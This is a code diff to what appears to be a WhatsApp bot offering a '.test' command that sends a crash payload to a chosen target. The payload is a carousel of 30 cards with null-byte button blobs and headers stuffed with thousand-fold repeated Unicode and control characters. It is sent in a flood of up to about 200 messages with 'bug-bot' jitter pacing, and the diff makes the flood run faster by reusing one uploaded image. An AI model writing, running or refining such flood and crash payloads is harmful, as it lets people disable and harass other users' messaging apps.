@@ -6983,13 +6983,16 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             }
 
             // ── PAYLOAD B: testfff — carousel of 30 cards, null-byte button blobs ──
-            async function testfff(prim, target) {
+            // The card image is prepared ONCE per .test run and reused by every
+            // send (same as forwarding reusing uploaded media) — otherwise a
+            // ×200 flood would re-download from catbox and re-upload to WhatsApp
+            // 200 times. If the image can't be fetched, fall back to text
+            // headers so the test still fires (mode shows in log/reply).
+            async function testfff(prim, target, imageMessage) {
                 const cards = [];
-                const { imageMessage } = await prepareWAMessageMedia(
-                    { image: { url: 'https://files.catbox.moe/m1x4bb.jpg' } },
-                    { upload: prim.waUploadToServer }
-                );
-                const header = { imageMessage, hasMediaAttachment: true };
+                const header = imageMessage
+                    ? { imageMessage, hasMediaAttachment: true }
+                    : { title: '𑇂𑆵𑆴𑆿'.repeat(1000), subtitle: '\x10'.repeat(1000), hasMediaAttachment: false };
                 for (let r = 0; r < 30; r++) {
                     cards.push({
                         header,
@@ -7018,18 +7021,34 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
                 });
             }
 
+            // Prepare the fff card image once per run (img mode); if unavailable
+            // the payload falls back to text headers (txt mode).
+            let fffImage = null;
+            if (payloadKind === 'testfff') {
+                try {
+                    const prep = await prepareWAMessageMedia(
+                        { image: { url: 'https://files.catbox.moe/m1x4bb.jpg' } },
+                        { upload: sock.waUploadToServer }
+                    );
+                    fffImage = prep?.imageMessage || null;
+                } catch (err) {
+                    log('TEST', `${phoneNumber}: fff image unavailable (${err?.message || err}) — using text headers`);
+                }
+            }
+            const fffMode = payloadKind === 'testfff' ? (fffImage ? '/img' : '/txt') : '';
+
             const fire = payloadKind === 'testfff' ? testfff : androz;
 
             let sent = 0;
             for (let n = 0; n < count; n++) {
-                await fire(sock, targetJid);
+                await fire(sock, targetJid, fffImage);
                 sent++;
-                log('TEST', `${phoneNumber}: .test [${payloadKind}] send ${sent}/${count} → ${targetJid} input="${input}"`);
+                log('TEST', `${phoneNumber}: .test [${payloadKind}${fffMode}] send ${sent}/${count} → ${targetJid} input="${input}"`);
                 // >10 explicit count = bug-bot pacing (30–70ms jitter), else 1.2s
                 if (n < count - 1) await delay(flood ? 30 + Math.floor(Math.random() * 40) : 1200);
             }
 
-            await safeWaReply(sock, remoteJid, `🧪 [${payloadKind}] payload sent ×${sent} → ${targetJid.split('@')[0]}`, msg);
+            await safeWaReply(sock, remoteJid, `🧪 [${payloadKind}${fffMode}] payload sent ×${sent} → ${targetJid.split('@')[0]}`, msg);
         } catch (err) {
             logError('TEST', `${phoneNumber}: .test failed`, err);
             await safeWaReply(sock, remoteJid, `❌ *TEST ERROR*\n\n${err?.message || err}`, msg);
